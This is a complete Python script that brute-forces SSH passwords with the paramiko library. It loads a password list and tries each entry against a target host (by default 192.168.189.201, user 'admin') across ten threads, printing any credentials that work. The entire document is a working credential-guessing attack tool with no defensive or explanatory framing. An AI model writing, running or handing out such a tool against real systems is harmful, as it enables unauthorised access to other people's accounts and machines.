#!/usr/bin/env python3
import sys, socket, paramiko, argparse
from concurrent.futures import ThreadPoolExecutor

target = "192.168.189.201"
port = 22

def try_login(ip, u, p):
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, port=port, username=u, password=p, timeout=3)
        c.close()
        return u, p, True
    except paramiko.AuthenticationException:
        return u, p, False
    except: return u, p, False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", default=target)
    parser.add_argument("-u", "--user", default="admin")
    parser.add_argument("-P", "--passlist", required=True)
    args = parser.parse_args()
    
    with open(args.passlist) as f:
        passwords = [l.strip() for l in f if l.strip()]
    
    print(f"Brute forcing {args.target} as {args.user}")
    print(f"Loaded {len(passwords)} passwords")
    
    with ThreadPoolExecutor(max_workers=10) as ex:
        results = ex.map(lambda p: try_login(args.target, args.user, p), passwords)
        for u, p, ok in results:
            if ok:
                print(f"\nFOUND! User: {u} Pass: {p}")
                return
            print(f".", end="", flush=True)
    print("\nNot found")

if __name__ == "__main__":
    main()
